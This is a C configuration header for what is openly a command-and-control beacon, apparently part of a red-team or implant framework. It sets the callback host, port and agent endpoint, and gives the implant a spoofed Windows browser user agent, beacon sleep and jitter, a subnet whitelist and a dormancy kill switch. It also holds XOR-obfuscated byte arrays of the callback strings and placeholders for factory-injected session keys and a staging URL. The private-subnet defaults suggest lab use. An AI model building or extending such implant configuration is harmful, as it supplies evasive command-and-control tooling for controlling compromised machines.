#ifndef CONFIG_H
#define CONFIG_H

#if __has_include("config.local.h")
#include "config.local.h"
#endif

/* ── Callback ─────────────────────────────────────────────────────── */
#ifndef CALLBACK_HOST
#define CALLBACK_HOST L"192.168.1.69"
#endif
#ifndef CALLBACK_PORT
#define CALLBACK_PORT 8443
#endif
#ifndef CALLBACK_ENDPOINT
#define CALLBACK_ENDPOINT L"/api/agents"
#endif
#ifndef CALLBACK_USERAGENT
#define CALLBACK_USERAGENT L"Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
#endif

/* ── Legacy aliases ───────────────────────────────────────────────── */
#define C2_HOST CALLBACK_HOST
#define C2_PORT CALLBACK_PORT
#define C2_ENDPOINT CALLBACK_ENDPOINT
#define C2_USERAGENT CALLBACK_USERAGENT

/* ── Timing ───────────────────────────────────────────────────────── */
#ifndef SLEEP_INTERVAL_MS
#define SLEEP_INTERVAL_MS 30000
#endif
#ifndef JITTER_PERCENT
#define JITTER_PERCENT 20
#endif

/* ── Network ──────────────────────────────────────────────────────── */
#ifndef READ_CHUNK_SIZE
#define READ_CHUNK_SIZE 4096
#endif
#ifndef MAX_TASK_BLOB_SIZE
#define MAX_TASK_BLOB_SIZE (1024 * 1024)
#endif

/* ── IP Whitelist ─────────────────────────────────────────────────── */
#ifndef WHITELIST_SUBNET_START
#define WHITELIST_SUBNET_START "192.168.1.1"
#endif
#ifndef WHITELIST_SUBNET_END
#define WHITELIST_SUBNET_END "192.168.1.254"
#endif

/* ── Identity ─────────────────────────────────────────────────────── */
#ifndef AGENT_ID_PREFIX
#define AGENT_ID_PREFIX "AGENT"
#endif

/* ── Crypto ───────────────────────────────────────────────────────── */
#ifndef SESSION_KEY_SEED_LEN
#define SESSION_KEY_SEED_LEN 32
#endif
#ifndef XOR_KEY
#define XOR_KEY 0x55
#endif

/* ── XOR-obfuscated config strings ────────────────────────────────
 * PayloadFactory emits these as byte arrays in config.local.h.
 * Defaults below are XOR'd with the default XOR_KEY (0x55).
 * At runtime, call xor_decode() before use.
 * Wide-char: each wchar_t is 2 bytes (little-endian), both XOR'd.
 * ----------------------------------------------------------------- */

/* Helper: default plaintext L"192.168.1.69" XOR'd with 0x55 */
#ifndef CALLBACK_HOST_XOR
#define CALLBACK_HOST_XOR { \
  0x64,0x55, 0x6C,0x55, 0x67,0x55, 0x7B,0x55, \
  0x64,0x55, 0x63,0x55, 0x6D,0x55, 0x7B,0x55, \
  0x64,0x55, 0x7B,0x55, 0x63,0x55, 0x6C,0x55  \
}
#define CALLBACK_HOST_XOR_LEN 24
#endif

/* Default plaintext L"/api/agents" XOR'd with 0x55 */
#ifndef CALLBACK_ENDPOINT_XOR
#define CALLBACK_ENDPOINT_XOR { \
  0x7A,0x55, 0x34,0x55, 0x25,0x55, 0x3C,0x55, \
  0x7A,0x55, 0x34,0x55, 0x32,0x55, 0x30,0x55, \
  0x3B,0x55, 0x21,0x55, 0x26,0x55  \
}
#define CALLBACK_ENDPOINT_XOR_LEN 22
#endif

/* Default plaintext L"Mozilla/5.0 (Windows NT 10.0; Win64; x64)" XOR'd with 0x55 */
#ifndef CALLBACK_USERAGENT_XOR
#define CALLBACK_USERAGENT_XOR { \
  0x18,0x55, 0x3A,0x55, 0x2F,0x55, 0x3C,0x55, \
  0x39,0x55, 0x39,0x55, 0x34,0x55, 0x7A,0x55, \
  0x60,0x55, 0x7B,0x55, 0x65,0x55, 0x75,0x55, \
  0x7D,0x55, 0x02,0x55, 0x3C,0x55, 0x3B,0x55, \
  0x31,0x55, 0x3A,0x55, 0x22,0x55, 0x26,0x55, \
  0x75,0x55, 0x1B,0x55, 0x01,0x55, 0x75,0x55, \
  0x64,0x55, 0x65,0x55, 0x7B,0x55, 0x65,0x55, \
  0x6E,0x55, 0x75,0x55, 0x02,0x55, 0x3C,0x55, \
  0x3B,0x55, 0x63,0x55, 0x61,0x55, 0x6E,0x55, \
  0x75,0x55, 0x2D,0x55, 0x63,0x55, 0x61,0x55, \
  0x7C,0x55  \
}
#define CALLBACK_USERAGENT_XOR_LEN 82
#endif

/* Default plaintext "AGENT" XOR'd with 0x55 (narrow string) */
#ifndef AGENT_ID_PREFIX_XOR
#define AGENT_ID_PREFIX_XOR { 0x14, 0x12, 0x10, 0x1B, 0x01 }
#define AGENT_ID_PREFIX_XOR_LEN 5
#endif

/* ── Staging / Session key (factory-injected) ─────────────────────
 * These are only defined when PayloadFactory generates config.local.h.
 * The beacon checks for SESSION_KEY_XOR at compile time to decide
 * whether to use factory-injected keys vs the hardcoded defaults.
 * ----------------------------------------------------------------- */
/* #define SESSION_KEY_XOR      { ... }   -- 32 bytes XOR'd           */
/* #define SESSION_KEY_XOR_LEN  32                                    */
/* #define SESSION_IV_XOR       { ... }   -- 16 bytes XOR'd           */
/* #define SESSION_IV_XOR_LEN   16                                    */
/* #define STAGING_URL_XOR      { ... }                               */
/* #define STAGING_URL_XOR_LEN  ...                                   */

/* ── Kill switch ──────────────────────────────────────────────────── */
#ifndef KILLSWITCH_DORMANT_DAYS
#define KILLSWITCH_DORMANT_DAYS 7
#endif

#endif /* CONFIG_H */